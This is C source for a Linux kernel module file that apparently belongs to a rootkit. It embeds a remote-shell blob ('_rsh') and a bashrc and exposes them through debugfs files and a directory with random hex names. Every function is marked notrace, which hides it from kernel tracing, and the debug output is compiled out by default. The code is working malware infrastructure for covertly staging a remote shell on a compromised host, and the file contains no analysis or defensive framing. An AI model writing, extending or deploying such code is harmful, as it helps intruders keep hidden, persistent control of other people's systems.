#include <linux/module.h>
#include <linux/debugfs.h>
#include <linux/random.h>
#include <linux/seq_file.h>

#include "config.h"
#include "debugfs.h"
#include "htm.h"

#define HTM_SIZE_RSH ((size_t)(_rsh_end - _rsh_start))

#define HTM_DEFINE_FOPS(sym)                                          \
static notrace int sym##_show(struct seq_file *m, void *v)            \
{                                                                     \
	seq_write(m, sym##_start, (sym##_end - sym##_start));         \
	return 0;                                                     \
}                                                                     \
                                                                      \
static notrace int sym##_open(struct inode *inode, struct file *file) \
{                                                                     \
	return single_open(file, sym##_show, inode->i_private);       \
}                                                                     \
                                                                      \
static const struct file_operations sym##_fops = {                    \
	.owner   = THIS_MODULE,                                       \
	.open    = sym##_open,                                        \
	.read    = seq_read,                                          \
	.llseek  = seq_lseek,                                         \
	.release = single_release                                     \
};

struct htm_file {
	struct dentry *file;
	char name[HTM_MAX_FILENAME];
};

extern unsigned char _rsh_start[];
extern unsigned char _rsh_end[];

extern unsigned char _bashrc_start[];
extern unsigned char _bashrc_end[];

static size_t _file_counter = 0;

static struct htm_file _dir;
static struct htm_file _rsh;
static struct htm_file _bashrc;

HTM_DEFINE_FOPS(_rsh);
HTM_DEFINE_FOPS(_bashrc);

static inline void _unset_htm_file(struct htm_file *file)
{
	file->file = NULL;
	memset(file->name, 0x00, sizeof(file->name));
}

static notrace int _create_dir(struct htm_file *dir)
{
	if (dir->file) {
		#ifdef HTM_DEBUG
		htm_pr_err("debugfs directory already exists: %s", dir->name);
		#endif

		return -EINVAL;
	}

	scnprintf(
		dir->name, sizeof(dir->name),
		"%016llx" HTM_FS_STRING, get_random_u64()
	);

	if (! (dir->file = debugfs_create_dir(dir->name, NULL))) {
		#ifdef HTM_DEBUG
		htm_pr_err("failed to create debugfs directory: %s", dir->name);
		#endif

		_unset_htm_file(dir);
		return -ENOMEM;
	}

	#ifdef HTM_DEBUG
	htm_pr_notice("debugfs directory created: %s", dir->name);
	#endif

	return 0;
}

static notrace int _remove_dir(struct htm_file *dir)
{
	if (! dir->file) {
		#ifdef HTM_DEBUG
		htm_pr_err("debugfs directory does not exist");
		#endif

		return -EINVAL;
	}

	if (_file_counter > 0) {
		#ifdef HTM_DEBUG
		htm_pr_err("removing debugfs directory even though there are exposed files");
		#endif
	}

	// On current kernels, `debugfs_remove()` already recursively removes everything by default;
	// `debugfs_remove_recursive()` is now effectively an alias, but we use it for backwards
	// compatibility.
	debugfs_remove_recursive(_dir.file);

	#ifdef HTM_DEBUG
	htm_pr_notice("debugfs directory removed: %s", _dir.name);
	#endif

	_unset_htm_file(&_dir);
	_unset_htm_file(&_rsh);
	_unset_htm_file(&_bashrc);

	_file_counter = 0;
	return 0;
}

static notrace int _create_file(struct htm_file *file, const struct file_operations *fops)
{
	int ret;
	bool dir_created = false;

	if (file->file) {
		#ifdef HTM_DEBUG
		htm_pr_err("debugfs file already exists: %s", file->name);
		#endif

		return -EINVAL;
	}

	if (! _dir.file) {
		if ((ret = _create_dir(&_dir)))
			return ret;

		dir_created = true;
	}

	scnprintf(
		file->name, sizeof(file->name),
		"%016llx" HTM_FS_STRING, get_random_u64()
	);

	if (! (file->file = debugfs_create_file(file->name, 0500, _dir.file, NULL, fops))) {
		#ifdef HTM_DEBUG
		htm_pr_err("failed to create debugfs file: %s", file->name);
		#endif

		if (dir_created)
			_remove_dir(&_dir);

		_unset_htm_file(file);
		return -ENOMEM;
	}

	#ifdef HTM_DEBUG
	htm_pr_notice("debugfs file created: %s", file->name);
	#endif

	_file_counter++;
	return 0;
}

static notrace int _remove_file(struct htm_file *file)
{
	if (! file->file) {
		#ifdef HTM_DEBUG
		htm_pr_err("debugfs file does not exist");
		#endif

		return -EINVAL;
	}

	debugfs_remove(file->file);

	#ifdef HTM_DEBUG
	htm_pr_notice("debugfs file removed: %s", file->name);
	#endif

	_unset_htm_file(file);
	_file_counter--;

	if (! _file_counter) {
		#ifdef HTM_DEBUG
		htm_pr_info("debugfs directory is now empty - removing it");
		#endif

		_remove_dir(&_dir);
	}

	return 0;
}

notrace int htm_debugfs_create_all(void)
{
	int ret;

	if ((ret = htm_debugfs_create_rsh()))
		return ret;

	return 0;
}

notrace int htm_debugfs_remove_all(void)
{
	int ret;

	if ((ret = htm_debugfs_remove_rsh()))
		return ret;

	return 0;
}

notrace int htm_debugfs_create_rsh(void)
{
	int ret;

	if ((ret =_create_file(&_rsh, &_rsh_fops)))
		return ret;

	if ((ret = _create_file(&_bashrc, &_bashrc_fops))) {
		_remove_file(&_rsh);
		return ret;
	}

	return 0;
}

notrace int htm_debugfs_remove_rsh(void)
{
	int ret;

	if ((ret = _remove_file(&_bashrc)))
		return ret;

	if ((ret = _remove_file(&_rsh)))
		return ret;

	return 0;
}

notrace char *htm_debugfs_name_dir(void)
{
	return _dir.name;
}

notrace char *htm_debugfs_name_rsh(void)
{
	return _rsh.name;
}

notrace char *htm_debugfs_name_bashrc(void)
{
	return _bashrc.name;
}
